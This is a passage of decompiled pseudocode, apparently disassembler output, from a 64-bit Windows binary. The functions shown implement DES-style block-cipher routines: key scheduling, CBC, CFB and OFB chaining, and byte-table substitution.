  unsigned __int64 v12; // r15
  int v13; // ecx
  int v14; // ecx
  int v15; // eax
  char *v16; // r14
  int v17; // ecx
  int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // edx
  int v24; // eax
  int v25; // eax
  int v27; // edi
  int v28; // ecx
  __int64 v29; // r15
  int v30; // r13d
  int v31; // r12d
  int v32; // r12d
  unsigned int v33; // r13d
  unsigned __int64 v34; // r15
  int v35; // esi
  int v36; // edi
  int v37; // edi
  int v38; // eax
  int v39; // edi
  int v40; // ecx
  int v41; // edx
  int v42; // ecx
  int v43; // esi
  int v44; // edx
  int v45; // edx
  int v46; // r8d
  __int64 v47; // rbx
  int v48; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v49; // [rsp+24h] [rbp-Ch]
  __int64 v50; // [rsp+28h] [rbp-8h]
  unsigned int *v51; // [rsp+78h] [rbp+48h]
  int v52; // [rsp+88h] [rbp+58h]
  int v53; // [rsp+88h] [rbp+58h]

  v51 = a4;
  if ( a6 )
  {
    v9 = a3 - 8;
    v10 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
    v11 = ((*((unsigned __int8 *)a5 + 6) | (*((unsigned __int8 *)a5 + 7) << 8)) << 16) | (*((unsigned __int8 *)a5 + 5) << 8) | *((unsigned __int8 *)a5 + 4);
    if ( (int)(a3 - 8) >= 0 )
    {
      v12 = (unsigned __int64)(v9 + 8) >> 3;
      v9 -= 8 * ((v9 + 8) >> 3);
      do
      {
        v13 = a1[2];
        v48 = v10 ^ ((*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1);
        v14 = (*((unsigned __int8 *)a1 + 6) << 16) | v13;
        v15 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v49 = v11 ^ (v15 | v14);
        sub_140083220(&v48, v51, 1);
        v10 = v48;
        v11 = v49;
        *(_WORD *)a2 = v48;
        *(_BYTE *)(a2 + 2) = BYTE2(v10);
        *(_BYTE *)(a2 + 3) = HIBYTE(v10);
        *(_DWORD *)(a2 + 4) = v11;
        a2 += 8i64;
        --v12;
      }
      while ( v12 );
    }
    if ( v9 != -8 )
    {
      v16 = (char *)a1 + (int)(v9 + 8);
      v17 = 0;
      v18 = 0;
      switch ( v9 )
      {
        case 0xFFFFFFF9:
          goto LABEL_14;
        case 0xFFFFFFFA:
          goto LABEL_13;
        case 0xFFFFFFFB:
          goto LABEL_12;
        case 0xFFFFFFFC:
          goto LABEL_11;
        case 0xFFFFFFFD:
          goto LABEL_10;
        case 0xFFFFFFFE:
          goto LABEL_9;
        case 0xFFFFFFFF:
          goto LABEL_8;
        case 0u:
          v19 = (unsigned __int8)*--v16;
          v17 = v19 << 24;
LABEL_8:
          v20 = (unsigned __int8)*--v16;
          v17 |= v20 << 16;
LABEL_9:
          v21 = (unsigned __int8)*--v16;
          v17 |= v21 << 8;
LABEL_10:
          v22 = (unsigned __int8)*--v16;
          v17 |= v22;
LABEL_11:
          v23 = (unsigned __int8)*--v16;
          v18 = v23 << 24;
LABEL_12:
          v24 = (unsigned __int8)*--v16;
          v18 |= v24 << 16;
LABEL_13:
          v25 = (unsigned __int8)*--v16;
          v18 |= v25 << 8;
LABEL_14:
          v18 |= (unsigned __int8)*(v16 - 1);
          break;
        default:
          break;
      }
      v48 = v10 ^ v18;
      v49 = v11 ^ v17;
      sub_140083220(&v48, v51, 1);
      v10 = v48;
      v11 = v49;
      *(_WORD *)a2 = v48;
      *(_BYTE *)(a2 + 2) = BYTE2(v10);
      *(_BYTE *)(a2 + 3) = HIBYTE(v10);
      *(_DWORD *)(a2 + 4) = v11;
    }
    *(_DWORD *)a5 = v10;
    *((_DWORD *)a5 + 1) = v11;
    return HIWORD(v11);
  }
  else
  {
    v27 = a3 - 8;
    v28 = *((unsigned __int8 *)a5 + 7);
    v29 = (__int64)a5 + 1;
    v30 = *((unsigned __int8 *)a5 + 4);
    v31 = (*((unsigned __int8 *)a5 + 2) << 16) | (*((unsigned __int8 *)a5 + 1) << 8) | *(unsigned __int8 *)a5;
    v50 = (__int64)a5 + 1;
    v32 = (*((unsigned __int8 *)a5 + 3) << 24) | v31;
    v33 = ((*((unsigned __int8 *)a5 + 6) | (v28 << 8)) << 16) | (*((unsigned __int8 *)a5 + 5) << 8) | v30;
    if ( (int)(a3 - 8) >= 0 )
    {
      v34 = (unsigned __int64)a3 >> 3;
      v52 = a3 - 8 - 8 * (a3 >> 3);
      do
      {
        v36 = a1[2];
        v48 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
        v35 = v48;
        v37 = (*((unsigned __int8 *)a1 + 6) << 16) | v36;
        v38 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v39 = v38 | v37;
        v49 = v39;
        sub_140083220(&v48, a4, 0);
        v40 = v32 ^ v48;
        a4 = v51;
        v41 = v33 ^ v49;
        *(_BYTE *)a2 = v32 ^ v48;
        v32 = v35;
        *(_BYTE *)(a2 + 1) = BYTE1(v40);
        v33 = v39;
        *(_BYTE *)(a2 + 2) = BYTE2(v40);
        *(_BYTE *)(a2 + 3) = HIBYTE(v40);
        *(_DWORD *)(a2 + 4) = v41;
        a2 += 8i64;
        --v34;
      }
      while ( v34 );
      v29 = v50;
      v27 = v52;
    }
    if ( v27 != -8 )
    {
      v42 = *((unsigned __int8 *)a1 + 7) << 8;
      v43 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
      v44 = a1[2];
      v48 = v43;
      v53 = ((*((unsigned __int8 *)a1 + 6) | v42) << 16) | v44;
      v49 = v53;
      sub_140083220(&v48, a4, 0);
      v45 = v32 ^ v48;
      v46 = v33 ^ v49;
      v47 = v27 + 8 + a2;
      switch ( v27 )
      {
        case -7:
          goto LABEL_30;
        case -6:
          goto LABEL_29;
        case -5:
          goto LABEL_28;
        case -4:
          goto LABEL_27;
        case -3:
          goto LABEL_26;
        case -2:
          goto LABEL_25;
        case -1:
          goto LABEL_24;
        case 0:
          *(_BYTE *)--v47 = HIBYTE(v46);
LABEL_24:
          *(_BYTE *)--v47 = BYTE2(v46);
LABEL_25:
          *(_BYTE *)--v47 = BYTE1(v46);
LABEL_26:
          *(_BYTE *)--v47 = v46;
LABEL_27:
          *(_BYTE *)--v47 = HIBYTE(v45);
LABEL_28:
          *(_BYTE *)--v47 = BYTE2(v45);
LABEL_29:
          *(_BYTE *)--v47 = BYTE1(v45);
LABEL_30:
          *(_BYTE *)(v47 - 1) = v45;
          break;
        default:
          break;
      }
      v33 = v53;
      v32 = v43;
    }
    *(_BYTE *)a5 = v32;
    *(_BYTE *)v29 = BYTE1(v32);
    *(_BYTE *)(v29 + 1) = BYTE2(v32);
    *(_BYTE *)(v29 + 2) = HIBYTE(v32);
    *(_DWORD *)(v29 + 3) = v33;
    return HIWORD(v33);
  }
}

//----- (0000000140085F80) ----------------------------------------------------
__int64 __fastcall sub_140085F80(
        __int64 a1,
        __int64 a2,
        int a3,
        unsigned int a4,
        unsigned int *a5,
        unsigned __int8 *a6,
        int a7)
{
  __int64 v9; // r9
  int v11; // r11d
  __int64 result; // rax
  __int64 v13; // r10
  int v14; // eax
  int v15; // ecx
  int v16; // esi
  __int64 v17; // r13
  int v18; // r14d
  __int64 v19; // r8
  int v20; // r14d
  unsigned int v21; // esi
  int v22; // r8d
  int v23; // edx
  __int64 v24; // rdi
  int v25; // r8d
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // edx
  int v30; // eax
  int v31; // eax
  int v32; // eax
  int v33; // edx
  int v34; // r8d
  __int64 v35; // rbx
  int v36; // r8d
  __int64 v37; // rdi
  int v38; // r12d
  int v39; // r15d
  int v40; // r12d
  int v41; // eax
  int v42; // eax
  int v43; // eax
  int v44; // r15d
  int v45; // eax
  int v46; // eax
  int v47; // eax
  int v48; // r15d
  __int64 v49; // rbx
  int v50; // r12d
  int v51; // [rsp+20h] [rbp-51h]
  char v52; // [rsp+24h] [rbp-4Dh]
  int v53; // [rsp+24h] [rbp-4Dh]
  int v54; // [rsp+28h] [rbp-49h] BYREF
  unsigned int v55; // [rsp+2Ch] [rbp-45h]
  int v56; // [rsp+34h] [rbp-3Dh]
  int v57; // [rsp+38h] [rbp-39h]
  unsigned int v58; // [rsp+3Ch] [rbp-35h]
  unsigned int *v59; // [rsp+40h] [rbp-31h]
  __int64 v60; // [rsp+48h] [rbp-29h]
  unsigned __int8 *v61; // [rsp+50h] [rbp-21h]
  _BYTE *v62; // [rsp+58h] [rbp-19h]
  int v63; // [rsp+60h] [rbp-11h] BYREF
  unsigned int v64; // [rsp+64h] [rbp-Dh]
  int v65; // [rsp+68h] [rbp-9h]
  int v66; // [rsp+6Ch] [rbp-5h]

  v59 = a5;
  v9 = a3;
  v62 = a6;
  v11 = a3 % 8;
  v56 = a3 % 8;
  v51 = a3 / 8;
  result = (unsigned int)((a3 + 7) / 8);
  v13 = (int)result;
  if ( (unsigned int)(a3 - 1) <= 0x3F )
  {
    v14 = a6[3];
    v15 = a6[1] << 8;
    v16 = a6[4];
    v17 = v13;
    v18 = *a6;
    v19 = (__int64)(a6 + 1);
    v61 = a6 + 1;
    v60 = v9;
    v20 = (v14 << 24) | (a6[2] << 16) | v15 | v18;
    v21 = (*((unsigned __int16 *)a6 + 3) << 16) | (a6[5] << 8) | v16;
    if ( a7 )
    {
      if ( a4 >= (unsigned int)v13 )
      {
        v52 = 8 - v11;
        do
        {
          v54 = v20;
          a4 -= v13;
          v55 = v21;
          sub_140083220(&v54, v59, 1);
          v22 = 0;
          v23 = 0;
          v24 = v17 + a1;
          LODWORD(v13) = v17;
          switch ( (int)v17 )
          {
            case 1:
              goto LABEL_13;
            case 2:
              goto LABEL_12;
            case 3:
              goto LABEL_11;
            case 4:
              goto LABEL_10;
            case 5:
              goto LABEL_9;
            case 6:
              goto LABEL_8;
            case 7:
              goto LABEL_7;
            case 8:
              v25 = *(unsigned __int8 *)--v24;
              v22 = v25 << 24;
LABEL_7:
              v26 = *(unsigned __int8 *)--v24;
              v22 |= v26 << 16;
LABEL_8:
              v27 = *(unsigned __int8 *)--v24;
              v22 |= v27 << 8;
LABEL_9:
              v28 = *(unsigned __int8 *)--v24;
              v22 |= v28;
LABEL_10:
              v29 = *(unsigned __int8 *)--v24;
              v23 = v29 << 24;
LABEL_11:
              v30 = *(unsigned __int8 *)--v24;
              v23 |= v30 << 16;
LABEL_12:
              v31 = *(unsigned __int8 *)--v24;
              v23 |= v31 << 8;
LABEL_13:
              v32 = *(unsigned __int8 *)--v24;
              v23 |= v32;
              break;
            default:
              break;
          }
          v33 = v54 ^ v23;
          a1 = v17 + v24;
          v34 = v55 ^ v22;
          v35 = v17 + a2;
          switch ( (int)v17 )
          {
            case 1:
              goto LABEL_22;
            case 2:
              goto LABEL_21;
            case 3:
              goto LABEL_20;
            case 4:
              goto LABEL_19;
            case 5:
              goto LABEL_18;
            case 6:
              goto LABEL_17;
            case 7:
              goto LABEL_16;
            case 8:
              *(_BYTE *)--v35 = HIBYTE(v34);
LABEL_16:
              *(_BYTE *)--v35 = BYTE2(v34);
LABEL_17:
              *(_BYTE *)--v35 = BYTE1(v34);
LABEL_18:
              *(_BYTE *)--v35 = v34;
LABEL_19:
              *(_BYTE *)--v35 = HIBYTE(v33);
LABEL_20:
              *(_BYTE *)--v35 = BYTE2(v33);
LABEL_21:
              *(_BYTE *)--v35 = BYTE1(v33);
LABEL_22:
              *(_BYTE *)--v35 = v33;
              break;
            default:
              break;
          }
          a2 = v17 + v35;
          if ( v60 == 32 )
          {
            v20 = v21;
            v21 = v33;
          }
          else if ( v60 == 64 )
          {
            v20 = v33;
            v21 = v34;
          }
          else
          {
            v63 = v20;
            v64 = v21;
            v65 = v33;
            v66 = v34;
            if ( v56 )
            {
              LOBYTE(v63) = (*((_BYTE *)&v63 + v51) << v56) | (*((_BYTE *)&v63 + v51 + 1) >> v52);
              BYTE1(v63) = (*((_BYTE *)&v63 + v51 + 2) >> v52) | (*((_BYTE *)&v63 + v51 + 1) << v56);
              BYTE2(v63) = (*((_BYTE *)&v63 + v51 + 3) >> v52) | (*((_BYTE *)&v63 + v51 + 2) << v56);
              HIBYTE(v63) = (*((_BYTE *)&v64 + v51) >> v52) | (*((_BYTE *)&v63 + v51 + 3) << v56);
              LOBYTE(v64) = (*((_BYTE *)&v64 + v51 + 1) >> v52) | (*((_BYTE *)&v64 + v51) << v56);
              BYTE1(v64) = (*((_BYTE *)&v64 + v51 + 2) >> v52) | (*((_BYTE *)&v64 + v51 + 1) << v56);
              BYTE2(v64) = (*((_BYTE *)&v64 + v51 + 3) >> v52) | (*((_BYTE *)&v64 + v51 + 2) << v56);
              HIBYTE(v64) = (*((_BYTE *)&v65 + v51) >> v52) | (*((_BYTE *)&v64 + v51 + 3) << v56);
            }
            else
            {
              memmove(&v63, (char *)&v63 + v51, 8ui64);
              LODWORD(v13) = v17;
            }
            v20 = v63;
            v21 = v64;
          }
        }
        while ( a4 >= (unsigned int)v13 );
LABEL_62:
        v19 = (__int64)v61;
      }
    }
    else if ( a4 >= (unsigned int)v13 )
    {
      v57 = 8 - v11;
      v53 = v13 - 1;
      do
      {
        v54 = v20;
        v58 = a4 - v13;
        v55 = v21;
        sub_140083220(&v54, v59, 1);
        v36 = v53;
        v37 = v17 + a1;
        v38 = 0;
        v39 = 0;
        switch ( v53 )
        {
          case 0:
            goto LABEL_43;
          case 1:
            goto LABEL_42;
          case 2:
            goto LABEL_41;
          case 3:
            goto LABEL_40;
          case 4:
            goto LABEL_39;
          case 5:
            goto LABEL_38;
          case 6:
            goto LABEL_37;
          case 7:
            v40 = *(unsigned __int8 *)--v37;
            v38 = v40 << 24;
LABEL_37:
            v41 = *(unsigned __int8 *)--v37;
            v38 |= v41 << 16;
LABEL_38:
            v42 = *(unsigned __int8 *)--v37;
            v38 |= v42 << 8;
LABEL_39:
            v43 = *(unsigned __int8 *)--v37;
            v38 |= v43;
LABEL_40:
            v44 = *(unsigned __int8 *)--v37;
            v39 = v44 << 24;
LABEL_41:
            v45 = *(unsigned __int8 *)--v37;
            v39 |= v45 << 16;
LABEL_42:
            v46 = *(unsigned __int8 *)--v37;
            v39 |= v46 << 8;
LABEL_43:
            v47 = *(unsigned __int8 *)--v37;
            v39 |= v47;
            break;
          default:
            break;
        }
        a1 = v17 + v37;
        if ( v60 == 32 )
        {
          v20 = v21;
          v21 = v39;
        }
        else if ( v60 == 64 )
        {
          v20 = v39;
          v21 = v38;
        }
        else
        {
          v63 = v20;
          v64 = v21;
          v65 = v39;
          v66 = v38;
          if ( v56 )
          {
            LOBYTE(v63) = (*((_BYTE *)&v63 + v51 + 1) >> v57) | (*((_BYTE *)&v63 + v51) << v56);
            BYTE1(v63) = (*((_BYTE *)&v63 + v51 + 2) >> v57) | (*((_BYTE *)&v63 + v51 + 1) << v56);
            BYTE2(v63) = (*((_BYTE *)&v63 + v51 + 3) >> v57) | (*((_BYTE *)&v63 + v51 + 2) << v56);
            HIBYTE(v63) = (*((_BYTE *)&v64 + v51) >> v57) | (*((_BYTE *)&v63 + v51 + 3) << v56);
            LOBYTE(v64) = (*((_BYTE *)&v64 + v51 + 1) >> v57) | (*((_BYTE *)&v64 + v51) << v56);
            BYTE1(v64) = (*((_BYTE *)&v64 + v51 + 2) >> v57) | (*((_BYTE *)&v64 + v51 + 1) << v56);
            BYTE2(v64) = (*((_BYTE *)&v64 + v51 + 3) >> v57) | (*((_BYTE *)&v64 + v51 + 2) << v56);
            HIBYTE(v64) = (*((_BYTE *)&v65 + v51) >> v57) | (*((_BYTE *)&v64 + v51 + 3) << v56);
          }
          else
          {
            memmove(&v63, (char *)&v63 + v51, 8ui64);
            v36 = v53;
          }
          v20 = v63;
          v21 = v64;
        }
        v48 = v54 ^ v39;
        v49 = v17 + a2;
        v50 = v55 ^ v38;
        switch ( v36 )
        {
          case 0:
            goto LABEL_60;
          case 1:
            goto LABEL_59;
          case 2:
            goto LABEL_58;
          case 3:
            goto LABEL_57;
          case 4:
            goto LABEL_56;
          case 5:
            goto LABEL_55;
          case 6:
            goto LABEL_54;
          case 7:
            *(_BYTE *)--v49 = HIBYTE(v50);
LABEL_54:
            *(_BYTE *)--v49 = BYTE2(v50);
LABEL_55:
            *(_BYTE *)--v49 = BYTE1(v50);
LABEL_56:
            *(_BYTE *)--v49 = v50;
LABEL_57:
            *(_BYTE *)--v49 = HIBYTE(v48);
LABEL_58:
            *(_BYTE *)--v49 = BYTE2(v48);
LABEL_59:
            *(_BYTE *)--v49 = BYTE1(v48);
LABEL_60:
            *(_BYTE *)--v49 = v48;
            break;
          default:
            break;
        }
        a4 = v58;
        a2 = v17 + v49;
        LODWORD(v13) = v17;
      }
      while ( v58 >= (unsigned int)v17 );
      goto LABEL_62;
    }
    *v62 = v20;
    *(_BYTE *)v19 = BYTE1(v20);
    *(_BYTE *)(v19 + 1) = BYTE2(v20);
    *(_BYTE *)(v19 + 2) = HIBYTE(v20);
    *(_DWORD *)(v19 + 3) = v21;
    return HIWORD(v21);
  }
  return result;
}

//----- (00000001400866A0) ----------------------------------------------------
__int64 __fastcall sub_1400866A0(unsigned __int8 *a1, __int64 a2, unsigned int *a3, int a4)
{
  int v4; // r10d
  unsigned __int8 *v5; // r11
  int v7; // ecx
  int v8; // edx
  __int16 v9; // ecx^2
  char v10; // al
  unsigned int v11; // ecx
  __int64 result; // rax
  int v13; // [rsp+30h] [rbp+8h] BYREF
  int v14; // [rsp+34h] [rbp+Ch]

  v4 = *a1;
  v5 = a1 + 1;
  v7 = a1[7] << 8;
  v8 = *(unsigned __int16 *)(v5 + 3);
  v13 = (v5[2] << 24) | (v5[1] << 16) | (*v5 << 8) | v4;
  v14 = v8 | ((v5[5] | v7) << 16);
  sub_140083220(&v13, a3, a4);
  v9 = HIWORD(v13);
  *(_WORD *)a2 = v13;
  *(_BYTE *)(a2 + 2) = v9;
  v10 = v14;
  *(_BYTE *)(a2 + 3) = HIBYTE(v9);
  v11 = v14;
  *(_BYTE *)(a2 + 4) = v10;
  *(_BYTE *)(a2 + 5) = BYTE1(v11);
  result = HIWORD(v11);
  *(_BYTE *)(a2 + 6) = BYTE2(v11);
  *(_BYTE *)(a2 + 7) = HIBYTE(v11);
  return result;
}

//----- (0000000140086770) ----------------------------------------------------
__int64 __fastcall sub_140086770(unsigned __int16 *a1, _DWORD *a2)
{
  _DWORD *v2; // rdi
  int v4; // eax
  unsigned int v5; // r9d
  int v6; // ecx
  unsigned int v7; // eax
  unsigned int v8; // r9d
  int v9; // ecx
  unsigned int v10; // eax
  int v11; // r9d
  int v12; // ecx
  unsigned int v13; // r9d
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  unsigned int v17; // ebx
  __int64 result; // rax
  unsigned int v19; // eax
  unsigned int v20; // edx
  unsigned int v21; // ecx
  unsigned int v22; // r11d
  int v23; // ecx

  v2 = &unk_140112F80;
  v4 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
  v5 = *((_DWORD *)a1 + 1);
  v6 = (v4 ^ (v5 >> 4)) & 0xF0F0F0F;
  v7 = (v6 ^ v4 ^ ((v6 ^ v4) << 18)) & 0xCCCC0000 ^ (((v6 ^ v4 ^ ((v6 ^ v4) << 18)) & 0xCCCC0000) >> 18) ^ v6 ^ v4;
  v8 = ((16 * v6) ^ v5 ^ (((16 * v6) ^ v5) << 18)) & 0xCCCC0000 ^ ((((16 * v6) ^ v5 ^ (((16 * v6) ^ v5) << 18)) & 0xCCCC0000) >> 18) ^ (16 * v6) ^ v5;
  v9 = (v7 ^ (v8 >> 1)) & 0x55555555;
  v10 = v9 ^ v7;
  v11 = (2 * v9) ^ v8;
  v12 = (v11 ^ (v10 >> 8)) & 0xFF00FF;
  v13 = v12 ^ v11;
  v14 = (v12 << 8) ^ v10;
  v15 = (v14 ^ (v13 >> 1)) & 0x55555555;
  v16 = v15 ^ v14;
  v17 = ((2 * v15) ^ v13) & 0xFF00 | ((unsigned __int8)((2 * v15) ^ v13) << 16) | ((v16 & 0xF000000F | (((2 * v15) ^ v13) >> 12) & 0xFF0) >> 4);
  LODWORD(result) = v16 & 0xFFFFFFF;
  do
  {
    if ( *v2 )
    {
      v19 = ((unsigned int)result >> 2) | ((_DWORD)result << 26);
      v20 = v17 << 26;
      v21 = v17 >> 2;
    }
    else
    {
      v19 = ((unsigned int)result >> 1) | ((_DWORD)result << 27);
      v20 = v17 << 27;
      v21 = v17 >> 1;
    }
    result = v19 & 0xFFFFFFF;
    v17 = (v21 | v20) & 0xFFFFFFF;
    ++v2;
    v22 = dword_140112780[result & 0x3F] | dword_140112780[((result & 0x1E000 | (unsigned __int64)(((unsigned int)result >> 1) & 0x60000)) >> 13)
                                                         + 128] | dword_140112780[(((unsigned __int8)result & 0xC0 | ((unsigned __int64)(unsigned int)result >> 1) & 0xF00) >> 6)
                                                                                + 64] | dword_140112780[((result & 0x100000 | ((result & 0xC00000 | (unsigned __int64)(((unsigned int)result >> 1) & 0x7000000)) >> 1)) >> 20) + 192];
    v23 = dword_140112780[(((unsigned __int8)v21 | (unsigned __int8)v20) & 0x3F) + 256] | dword_140112780[((v17 >> 15) & 0x3F) + 384] | dword_140112780[((v17 & 0x180 | (unsigned __int64)((v17 >> 1) & 0x1E00)) >> 7) + 320] | dword_140112780[(((v21 | v20) & 0x1E00000 | (unsigned __int64)((v17 >> 1) & 0x6000000)) >> 21) + 448];
    *a2 = __ROR4__((v23 << 16) | (unsigned __int16)v22, 30);
    a2[1] = __ROR4__(v23 & 0xFFFF0000 | HIWORD(v22), 26);
    a2 += 2;
  }
  while ( (__int64)v2 < (__int64)&unk_140112FC0 );
  return result;
}
// 140112780: using guessed type _DWORD dword_140112780[512];

//----- (0000000140086A20) ----------------------------------------------------
__int64 __fastcall sub_140086A20(unsigned __int8 *a1)
{
  __int64 result; // rax

  *a1 = byte_140112600[*a1];
  a1[1] = byte_140112600[a1[1]];
  a1[2] = byte_140112600[a1[2]];
  a1[3] = byte_140112600[a1[3]];
  a1[4] = byte_140112600[a1[4]];
  a1[5] = byte_140112600[a1[5]];
  a1[6] = byte_140112600[a1[6]];
  result = byte_140112600[a1[7]];
  a1[7] = result;
  return result;
}
// 140112600: using guessed type unsigned __int8 byte_140112600[384];

//----- (0000000140086A80) ----------------------------------------------------
char __fastcall sub_140086A80(char *a1, _BYTE *a2, int a3, unsigned int *a4, unsigned __int16 *a5, int *a6, int a7)
{
  int *v8; // r12
  int v9; // esi
  _BYTE *v10; // r14
  char *v11; // r15
  int v12; // ebx
  unsigned __int16 *v13; // rbp
  __int64 v14; // r15
  int v15; // edx
  int v16; // eax
  __int16 v17; // ecx^2
  char v18; // al
  int v19; // ecx
  char result; // al
  unsigned __int16 *v21; // rbp
  int v22; // edx
  int v23; // eax
  __int16 v24; // ecx^2
  char v25; // al
  int v26; // ecx
  char v27; // dl
  char v28; // cl

  v8 = a6;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v12 = *a6;
  if ( a7 )
  {
    if ( a3 )
    {
      v13 = a5;
      v14 = a1 - a2;
      do
      {
        --v9;
        if ( !v12 )
        {
          v15 = *((unsigned __int8 *)v13 + 4);
          v16 = *((unsigned __int8 *)v13 + 5);
          LODWORD(a5) = (*((unsigned __int8 *)v13 + 3) << 24) | (*((unsigned __int8 *)v13 + 2) << 16) | *v13;
          HIDWORD(a5) = (v16 << 8) | v15 | (v13[3] << 16);
          sub_140083220(&a5, a4, 1);
          v17 = WORD1(a5);
          *v13 = (unsigned __int16)a5;
          *((_BYTE *)v13 + 2) = v17;
          v18 = BYTE4(a5);
          *((_BYTE *)v13 + 3) = HIBYTE(v17);
          v19 = HIDWORD(a5);
          *((_BYTE *)v13 + 4) = v18;
          *((_BYTE *)v13 + 5) = BYTE1(v19);
          *((_BYTE *)v13 + 6) = BYTE2(v19);
          *((_BYTE *)v13 + 7) = HIBYTE(v19);
        }
        result = *((_BYTE *)v13 + v12) ^ v10[v14];
        *v10++ = result;
        *((_BYTE *)v13 + v12) = result;
        v12 = ((_BYTE)v12 + 1) & 7;
      }
      while ( v9 );
    }
  }
  else if ( a3 )
  {
    v21 = a5;
    do
    {
      --v9;
      if ( !v12 )
      {
        v22 = *((unsigned __int8 *)v21 + 4);
        v23 = *((unsigned __int8 *)v21 + 5);
        LODWORD(a5) = (*((unsigned __int8 *)v21 + 3) << 24) | (*((unsigned __int8 *)v21 + 2) << 16) | *v21;
        HIDWORD(a5) = (v23 << 8) | v22 | (v21[3] << 16);
        sub_140083220(&a5, a4, 1);
        v24 = WORD1(a5);
        *v21 = (unsigned __int16)a5;
        *((_BYTE *)v21 + 2) = v24;
        v25 = BYTE4(a5);
        *((_BYTE *)v21 + 3) = HIBYTE(v24);
        v26 = HIDWORD(a5);
        *((_BYTE *)v21 + 4) = v25;
        *((_BYTE *)v21 + 5) = BYTE1(v26);
        *((_BYTE *)v21 + 6) = BYTE2(v26);
        *((_BYTE *)v21 + 7) = HIBYTE(v26);
      }
      v27 = *v11++;
      result = v12;
      v28 = *((_BYTE *)v21 + v12);
      *((_BYTE *)v21 + v12) = v27;
      *v10++ = v28 ^ v27;
      v12 = ((_BYTE)v12 + 1) & 7;
    }
    while ( v9 );
  }
  *v8 = v12;
  return result;
}

//----- (0000000140086CB0) ----------------------------------------------------
__int64 __fastcall sub_140086CB0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6)
{
  int *v7; // r13
  int v8; // ecx
  int v10; // edx
  int v11; // r14d
  int v12; // r10d
  int v13; // ebx
  int v14; // r15d
  int v15; // r10d
  int v16; // r10d
  int v17; // edx
  int v18; // ecx
  unsigned int v19; // edx
  __int64 result; // rax
  unsigned int *v21; // r13
  __int64 v22; // r12
  unsigned __int8 v23; // r8
  unsigned __int8 v24; // r9
  int v25; // [rsp+20h] [rbp-40h] BYREF
  unsigned int v26; // [rsp+24h] [rbp-3Ch]
  unsigned int *v27; // [rsp+28h] [rbp-38h]
  int *v28; // [rsp+30h] [rbp-30h]
  unsigned __int8 *v29; // [rsp+38h] [rbp-28h]
  int v30; // [rsp+40h] [rbp-20h]
  unsigned int v31; // [rsp+44h] [rbp-1Ch]

  v7 = a6;
  v8 = a5[7];
  v10 = a5[4];
  v11 = a3;
  v12 = *a5;
  v13 = *a6;
  v14 = 0;
  v29 = a5;
  v15 = (a5[2] << 16) | (a5[1] << 8) | v12;
  v27 = (unsigned int *)a4;
  v16 = (a5[3] << 24) | v15;
  v28 = a6;
  v17 = (a5[5] << 8) | v10;
  v25 = v16;
  v18 = a5[6] | (v8 << 8);
  v30 = v16;
  v19 = (v18 << 16) | v17;
  v31 = v19;
  result = HIBYTE(v19);
  v26 = v19;
  if ( a3 )
  {
    v21 = v27;
    v22 = a2 - (_QWORD)a1;
    v23 = v19;
    v24 = v16;
    do
    {
      --v11;
      if ( !v13 )
      {
        sub_140083220(&v25, v21, 1);
        v16 = v25;
        v19 = v26;
        v24 = v25;
        v23 = v26;
        ++v14;
        v30 = v25;
        v31 = v26;
      }
      result = v13;
      a1[v22] = *a1 ^ *((_BYTE *)&v30 + v13);
      ++a1;
      v13 = ((_BYTE)v13 + 1) & 7;
    }
    while ( v11 );
    v7 = v28;
    if ( v14 )
    {
      *v29 = v24;
      a5[1] = BYTE1(v16);
      a5[2] = BYTE2(v16);
      a5[3] = HIBYTE(v16);
      a5[4] = v23;
      a5[5] = BYTE1(v19);
      result = HIWORD(v19);
      a5[6] = BYTE2(v19);
      a5[7] = HIBYTE(v19);
    }
  }
  *v7 = v13;
  return result;
}

//----- (0000000140086EA0) ----------------------------------------------------
__int64 __fastcall sub_140086EA0(
        unsigned __int8 *a1,
        __int64 a2,
        unsigned int *a3,
        unsigned int *a4,
        unsigned int *a5,
        int a6)
{
  int v6; // r10d
  unsigned __int8 *v7; // r11
  int v9; // ecx
  int v10; // edx
  __int16 v11; // ecx^2
  char v12; // al
  unsigned int v13; // ecx
  __int64 result; // rax
  int v15; // [rsp+30h] [rbp+8h] BYREF
  int v16; // [rsp+34h] [rbp+Ch]

  v6 = *a1;
  v7 = a1 + 1;
  v9 = a1[7] << 8;
  v10 = *(unsigned __int16 *)(v7 + 3);
  v15 = (v7[2] << 24) | (v7[1] << 16) | (*v7 << 8) | v6;
  v16 = v10 | ((v7[5] | v9) << 16);
  if ( a6 )
    sub_1400858A0((unsigned int *)&v15, a3, a4, a5);
  else
    sub_140082B40((unsigned int *)&v15, a3, a4, a5);
  v11 = HIWORD(v15);
  *(_WORD *)a2 = v15;
  *(_BYTE *)(a2 + 2) = v11;
  v12 = v16;
  *(_BYTE *)(a2 + 3) = HIBYTE(v11);
  v13 = v16;
  *(_BYTE *)(a2 + 4) = v12;
  *(_BYTE *)(a2 + 5) = BYTE1(v13);
  result = HIWORD(v13);
  *(_BYTE *)(a2 + 6) = BYTE2(v13);
  *(_BYTE *)(a2 + 7) = HIBYTE(v13);
  return result;
}

//----- (0000000140086F90) ----------------------------------------------------
char sub_140086F90(char *a1, _BYTE *a2, int a3, unsigned int *a4, unsigned int *a5, unsigned int *a6, ...)
{
  int v6; // esi
  int *v7; // r12
  _BYTE *v8; // r14
  char *v9; // r15
  int v10; // ebx
  unsigned __int16 *v11; // rbp
  __int64 v12; // r15
  int v13; // edx
  int v14; // eax
  __int16 v15; // ecx^2
  char v16; // al
  int v17; // ecx
  char result; // al
  unsigned __int16 *v19; // rbp
  int v20; // edx
  int v21; // eax
  __int16 v22; // ecx^2
  char v23; // al
  int v24; // ecx
